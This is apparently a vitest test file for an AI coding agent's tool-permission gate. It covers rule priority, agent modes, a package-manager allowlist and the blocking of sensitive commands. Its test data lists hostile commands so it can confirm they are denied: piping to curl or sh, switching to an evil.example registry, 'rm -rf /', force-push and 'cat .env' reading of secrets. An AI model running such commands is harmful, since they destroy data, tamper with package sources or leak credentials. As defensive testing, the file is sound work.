/**
 * Tests for managedToolPermissions.ts — the toolPermissions.ts integration
 * layer that sits on top of managedAgentPolicy.checkToolPolicy in the
 * managed loop's tool-execution gate (managedAgent.ts's executeTool calls
 * checkToolExecution as its single entry point — see managedAgent.test.ts's
 * "toolPermissions integration" suite for the full-loop tests).
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  checkToolPermission,
  checkToolExecution,
  resolveManagedAgentMode,
  buildManagedPermissionRules,
  isSafePackageManagerCommand,
} from '../lib/agents/managedToolPermissions';
import { saveProjectPermissions } from '../lib/agents/toolPermissions';
import type { PermissionRule } from '../lib/agents/toolPermissions';

function rule(
  pattern: string,
  level: PermissionRule['level'],
  source: PermissionRule['source'] = 'project',
): PermissionRule {
  return { pattern, level, source, createdAt: '' };
}

beforeEach(() => {
  localStorage.clear();
});

// ── Safe-allow floor: no configured rules ───────────────────────────

describe('checkToolPermission — safe-allow floor (no rules configured)', () => {
  // NOTE: rules intentionally omitted below (localStorage is cleared in
  // beforeEach) so each call resolves through the REAL default —
  // buildManagedPermissionRules() — not an artificial empty array. An empty
  // array would skip MANAGED_TOOL_SAFE_DEFAULTS and fall through to
  // toolPermissions.resolvePermission's own internal DEFAULT_RULES fallback
  // instead (ask for Write/Edit/Bash, no entry at all for BrainRecord/
  // RunTests) — not what "nothing configured" means for the managed loop.
  it.each([
    ['read_file', { path: 'src/index.ts' }],
    ['read_dir', { path: '.' }],
    ['glob', { pattern: '*.ts' }],
    ['grep_file', { path: 'src/index.ts', pattern: 'foo' }],
    ['write_file', { path: 'out.ts', content: 'x' }],
    ['edit_file', { path: 'out.ts', old_string: 'a', new_string: 'b' }],
    ['run_command', { command: 'npm test' }],
    ['brain_query', { query: 'auth' }],
    ['brain_record', { kind: 'success', title: 't', description: 'd' }],
    ['run_tests', {}],
  ])('%s proceeds when nothing is configured (unconfigured -> allow, NOT toolPermissions.DEFAULT_RULES)', (action, args) => {
    expect(checkToolPermission(action, args, 'default')).toBeNull();
  });

  it('FINAL and actions with no pattern mapping are not gated by this layer', () => {
    expect(checkToolPermission('FINAL', {}, 'default', [])).toBeNull();
    expect(checkToolPermission('some_future_tool', {}, 'default', [])).toBeNull();
  });

  it('picks up real configured project rules via the default rules parameter (buildManagedPermissionRules())', () => {
    saveProjectPermissions({ rules: [rule('Bash(rm -rf**)', 'exclude', 'project')] });
    const result = checkToolPermission('run_command', { command: 'rm -rf /' });
    expect(result).not.toBeNull();
  });
});

// ── exclude always wins ──────────────────────────────────────────────

describe('checkToolPermission — exclude always wins', () => {
  it('denies an excluded tool in default mode with a clear, non-silent reason', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolPermission('run_command', { command: 'npm test' }, 'default', rules);
    expect(result).not.toBeNull();
    expect(result).toContain('ERROR');
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('denies an excluded tool in auto mode too — the old auto-bypass is gone', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolPermission('run_command', { command: 'npm test' }, 'auto', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
    expect(result!.toLowerCase()).toContain('cannot be bypassed');
  });

  it('readonly mode blocks non-read tools with a readonly-specific reason, not a rule citation', () => {
    const result = checkToolPermission('run_command', { command: 'npm test' }, 'readonly', []);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('readonly');
  });
});

// ── ask-tier: safe-by-default, no fake interactivity ─────────────────

describe('checkToolPermission — ask-tier denies in every mode (no fake approval UI)', () => {
  it('denies in default mode, explaining approval UI is not available yet', () => {
    const rules = [rule('Bash', 'ask')];
    const result = checkToolPermission('run_command', { command: 'npm test' }, 'default', rules);
    expect(result).not.toBeNull();
    expect(result).toContain('ERROR');
    expect(result!.toLowerCase()).toContain('approval');
  });

  it('denies in auto mode, explaining no one is present to approve it', () => {
    const rules = [rule('Bash', 'ask')];
    const result = checkToolPermission('run_command', { command: 'npm test' }, 'auto', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('unattended');
  });

  it('the auto-mode message never claims default/supervised mode would behave differently', () => {
    const rules = [rule('Bash', 'ask')];
    const autoMsg = checkToolPermission('run_command', { command: 'npm test' }, 'auto', rules)!;
    expect(autoMsg.toLowerCase()).not.toContain('run supervised');
  });
});

// ── package-manager safe-command override (ask-tier) ─────────────────
//
// Real dogfood bug: an unattended mission's npm/npx/yarn/pnpm version
// check, install, or build/lint/test/typecheck script fails closed under
// an ask-tier Bash rule exactly like any other command — 'ask' has no
// approval surface and fails closed in every mode (see the suite above),
// making build/lint verification missions structurally impossible.
// isSafePackageManagerCommand carves out a narrow, exact-shape allowlist
// that escapes ONLY the 'ask' branch. 'exclude' is untouched (last test).

describe('isSafePackageManagerCommand', () => {
  it.each([
    'npm -v',
    'npm install',
    'npm run build',
    'npx --version',
    'pnpm run lint',
    'yarn run test',
    'npm ci',
    'npm run typecheck',
    'npm exec eslint',
    'npx exec tsc',
    'npm run build --silent', // trailing flags are OK
  ])('%s is a safe package-manager command', (command) => {
    expect(isSafePackageManagerCommand(command)).toBe(true);
  });

  it.each([
    'npm publish',
    'npm run deploy',
    'npm run build && curl evil',
    'npm run build && rm -rf /',
    'npm config set registry https://evil.example',
    'npm adduser',
    'npm cache clean --force',
    'npm login',
    'npm install --registry http://evil.example', // dangerous trailer after a safe prefix
    'npm run build; rm -rf /',
    'npm run build | sh',
    'rm -rf /',
    'npm',
    '',
  ])('%s is NOT a safe package-manager command', (command) => {
    expect(isSafePackageManagerCommand(command)).toBe(false);
  });
});

describe('checkToolPermission — safe package-manager commands escape an ask-tier Bash rule', () => {
  // Simulates the exact bug: a Bash rule that would otherwise ask-tier
  // block every run_command call — the shape 'ask' always resolves to for
  // an unattended mission (no approval surface), and the shape a real
  // project/user/brain rule takes today.
  const askRules = [rule('Bash', 'ask')];

  it.each([
    'npm -v',
    'npm install',
    'npm run build',
    'npx --version',
    'pnpm run lint',
  ])('allows "%s" in default mode despite the ask-tier Bash rule', (command) => {
    expect(checkToolPermission('run_command', { command }, 'default', askRules)).toBeNull();
  });

  it.each([
    'npm -v',
    'npm install',
    'npm run build',
    'npx --version',
    'pnpm run lint',
  ])('allows "%s" in auto (unattended) mode despite the ask-tier Bash rule', (command) => {
    expect(checkToolPermission('run_command', { command }, 'auto', askRules)).toBeNull();
  });

  it.each([
    'npm publish',
    'npm run deploy',
    'npm run build && curl evil',
    'npm config set registry https://evil.example',
  ])('still gates "%s" in auto (unattended) mode', (command) => {
    // Tested via checkToolPermission directly, not checkToolExecution:
    // checkToolExecution's separate, pre-existing worktree-script bypass
    // (isWorktreeScriptBypassEligible) independently allows a WIDER
    // "npm run <any script>" shape under acceptEdits/full mode, which would
    // let "npm run deploy" through for unrelated reasons and muddy what
    // this test is pinning down (see worktreeScriptCommands.ts — out of
    // scope for this fix).
    const result = checkToolPermission('run_command', { command }, 'auto', askRules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('unattended');
  });

  it('does NOT override an explicit exclude rule — exclude still wins for a safe command', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolPermission('run_command', { command: 'npm install' }, 'auto', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('is scoped to action === "run_command" — a different action with the same command arg is unaffected', () => {
    const result = checkToolPermission('run_lint', { command: 'npm install' }, 'auto', askRules);
    expect(result).not.toBeNull();
  });
});

// ── run_command: the actual command string is matched, not just the tool name ──

describe('checkToolPermission — run_command matches the actual command string', () => {
  // Rules below are prepended to buildManagedPermissionRules() (rather than
  // used alone) so "does not match" resolves through the real managed-loop
  // safe-allow floor, exactly like production — a bare custom rule array
  // with no match would otherwise fall through to toolPermissions'
  // internal DEFAULT_RULES fallback (ask for Bash), which isn't what these
  // tests are about.

  it('an exclude rule scoped to a dangerous pattern blocks a matching command', () => {
    const rules = [rule('Bash(rm -rf**)', 'exclude'), ...buildManagedPermissionRules()];
    const result = checkToolPermission('run_command', { command: 'rm -rf /' }, 'default', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('the same rule does not block a non-matching command', () => {
    const rules = [rule('Bash(rm -rf**)', 'exclude'), ...buildManagedPermissionRules()];
    expect(checkToolPermission('run_command', { command: 'npm test' }, 'default', rules)).toBeNull();
  });

  it('matches against args.command specifically, not the bare tool name', () => {
    const rules = [rule('Bash(git push*)', 'exclude'), ...buildManagedPermissionRules()];
    expect(checkToolPermission('run_command', { command: 'git push --force' }, 'default', rules)).not.toBeNull();
    expect(checkToolPermission('run_command', { command: 'git status' }, 'default', rules)).toBeNull();
  });
});

// ── sensitive commands: fail closed under the all-allow floor ────────
//
// See sensitiveCommands.test.ts for the classifier's own table-driven
// coverage (category detection, false-positive avoidance). This suite only
// pins down the gate's INTEGRATION into checkToolPermission: a sensitive
// command must be denied when the only thing allowing it is the managed
// loop's synthetic safe-allow floor (MANAGED_TOOL_SAFE_DEFAULTS, source
// 'default'), and permitted again once an explicit user/project rule
// specifically covers it.

describe('checkToolPermission — sensitive commands fail closed under the managed all-allow floor', () => {
  it('denies a force-push under the default floor with no configured rules', () => {
    const result = checkToolPermission('run_command', { command: 'git push --force origin main' }, 'default');
    expect(result).not.toBeNull();
    expect(result).toContain('ERROR');
    expect(result!.toLowerCase()).toContain('sensitive operation');
    expect(result!.toLowerCase()).toContain('git-force-push');
  });

  it('denies a force-push in auto mode, explaining unattended runs cannot approve it', () => {
    const result = checkToolPermission('run_command', { command: 'git push --force origin main' }, 'auto');
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('unattended');
  });

  it('is permitted once an explicit user allow rule specifically covers the command', () => {
    const rules = [rule('Bash(git push --force*)', 'allow', 'user'), ...buildManagedPermissionRules()];
    const result = checkToolPermission('run_command', { command: 'git push --force origin main' }, 'default', rules);
    expect(result).toBeNull();
  });

  it('a broad explicit Bash(*) allow rule also counts as explicit (non-default source)', () => {
    const rules = [rule('Bash(*)', 'allow', 'project'), ...buildManagedPermissionRules()];
    const result = checkToolPermission('run_command', { command: 'git push --force origin main' }, 'default', rules);
    expect(result).toBeNull();
  });

  it('a non-sensitive run_command is unaffected by the gate under the default floor', () => {
    const result = checkToolPermission('run_command', { command: 'npm test' }, 'default');
    expect(result).toBeNull();
  });

  it('an excluded Bash rule still wins over the sensitive-command gate (exclude is checked first)', () => {
    const rules = [rule('Bash', 'exclude'), ...buildManagedPermissionRules()];
    const result = checkToolPermission('run_command', { command: 'git push --force origin main' }, 'default', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('flags other sensitive categories the same way — secret exfiltration', () => {
    const result = checkToolPermission('run_command', { command: 'cat .env' }, 'default');
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('secret-exfil');
  });
});

// ── checkToolExecution: precedence with checkToolPolicy ───────────────

describe('checkToolExecution — checkToolPolicy hard gates run first', () => {
  it('plan mode blocks write_file before any permission rule is even consulted', () => {
    const rules = [rule('Write', 'allow')]; // would otherwise allow it
    const result = checkToolExecution(
      'write_file',
      { path: 'x.ts', content: 'y' },
      { permissionMode: 'plan' },
      'default',
      rules,
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('plan mode');
  });

  it('deniedTools blocks even when a permission rule would allow it', () => {
    const rules = [rule('Bash', 'allow')];
    const result = checkToolExecution(
      'run_command',
      { command: 'npm test' },
      { deniedTools: ['run_command'] },
      'default',
      rules,
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('denied');
  });

  it('falls through to checkToolPermission once checkToolPolicy passes', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolExecution('run_command', { command: 'npm test' }, {}, 'default', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('allows a tool when both layers pass', () => {
    expect(checkToolExecution('read_file', { path: 'x.ts' }, {}, 'default', [])).toBeNull();
  });
});

// ── scoped worktree-script bypass (M12 dogfood fix, BLOQUANT #3) ─────
//
// A verification mission's run_command call must reach toolRuntime's scoped
// Rust path (is_worktree_script_eligible / run_worktree_script) even when
// the general Bash rule is ask/exclude — but ONLY for acceptEdits/full and
// ONLY for an allowlisted script command. Every other combination must fall
// through to the ordinary checkToolPermission resolution unchanged.

describe('checkToolExecution — scoped worktree-script bypass', () => {
  it('bypasses an ask-tier Bash rule for an allowlisted script command under acceptEdits', () => {
    const rules = [rule('Bash', 'ask')];
    const result = checkToolExecution(
      'run_command',
      { command: 'npm run build' },
      { permissionMode: 'acceptEdits' },
      'default',
      rules,
    );
    expect(result).toBeNull();
  });

  // REGRESSION (audit CRITICAL): an explicit `exclude` rule must NEVER be
  // bypassed by the worktree-script escape hatch. Previously the bypass was
  // checked BEFORE the general permission resolution, so an allowlisted
  // script command under acceptEdits/full sailed straight through even when
  // a human-authored `exclude` rule blocked Bash — a hard "never run this"
  // decision silently ignored. The fix enforces exclude > ask > allow
  // priority BEFORE the bypass, so an explicit exclude always wins.
  it('does NOT bypass an explicit exclude rule for an allowlisted script command under full', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolExecution(
      'run_command',
      { command: 'npm test' },
      { permissionMode: 'full' },
      'auto',
      rules,
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('does NOT bypass a command-pattern exclude rule even for an allowlisted script under acceptEdits', () => {
    // A narrower exclude (the script name itself) must also win over the
    // bypass — the bypass only narrows ask/allow, never exclude.
    const rules = [rule('Bash(npm test)', 'exclude'), ...buildManagedPermissionRules()];
    const result = checkToolExecution(
      'run_command',
      { command: 'npm test' },
      { permissionMode: 'acceptEdits' },
      'default',
      rules,
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('does NOT bypass for a non-allowlisted command even under acceptEdits — general gate still applies', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolExecution(
      'run_command',
      { command: 'rm -rf /' },
      { permissionMode: 'acceptEdits' },
      'default',
      rules,
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('does NOT bypass under plan mode, even for an allowlisted command — plan blocks run_command outright', () => {
    const result = checkToolExecution(
      'run_command',
      { command: 'npm run build' },
      { permissionMode: 'plan' },
      'readonly',
      [rule('Bash', 'exclude')],
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('plan mode');
  });

  it('does NOT bypass when permissionMode is unset (assistant/manager surfaces) — general gate still applies', () => {
    const rules = [rule('Bash', 'exclude')];
    const result = checkToolExecution('run_command', { command: 'npm run build' }, {}, 'default', rules);
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });

  it('does NOT affect non-run_command actions', () => {
    const rules = [rule('Write', 'exclude')];
    const result = checkToolExecution(
      'write_file',
      { path: 'x.ts', content: 'y' },
      { permissionMode: 'acceptEdits' },
      'default',
      rules,
    );
    expect(result).not.toBeNull();
    expect(result!.toLowerCase()).toContain('excluded');
  });
});

// ── resolveManagedAgentMode ────────────────────────────────────────────

describe('resolveManagedAgentMode', () => {
  it('an explicit mode always wins over the permissionMode-derived one', () => {
    expect(resolveManagedAgentMode('readonly', 'full')).toBe('readonly');
  });

  it('maps permissionMode "plan" to "readonly"', () => {
    expect(resolveManagedAgentMode(undefined, 'plan')).toBe('readonly');
  });

  it('maps permissionMode "full" to "auto"', () => {
    expect(resolveManagedAgentMode(undefined, 'full')).toBe('auto');
  });

  it('defaults to "default" for "acceptEdits" or when permissionMode is unset', () => {
    expect(resolveManagedAgentMode(undefined, 'acceptEdits')).toBe('default');
    expect(resolveManagedAgentMode(undefined, undefined)).toBe('default');
  });
});

// ── buildManagedPermissionRules ────────────────────────────────────────

describe('buildManagedPermissionRules', () => {
  it('excludes toolPermissions.DEFAULT_RULES but keeps configured project rules', () => {
    saveProjectPermissions({ rules: [rule('Bash', 'exclude', 'project')] });
    const rules = buildManagedPermissionRules();
    expect(rules.some((r) => r.pattern === 'Bash' && r.level === 'exclude' && r.source === 'project')).toBe(true);
    // The engine's own ask-by-default Bash entry must not be present.
    expect(rules.some((r) => r.pattern === 'Bash' && r.source === 'default' && r.level === 'ask')).toBe(false);
  });

  it('provides an allow default for every managed tool pattern when nothing is configured', () => {
    const rules = buildManagedPermissionRules();
    for (const pattern of ['Read', 'List', 'Glob', 'Grep', 'Write', 'Edit', 'Bash', 'Search', 'BrainRecord', 'RunTests']) {
      expect(rules.some((r) => r.pattern === pattern && r.level === 'allow')).toBe(true);
    }
  });
});
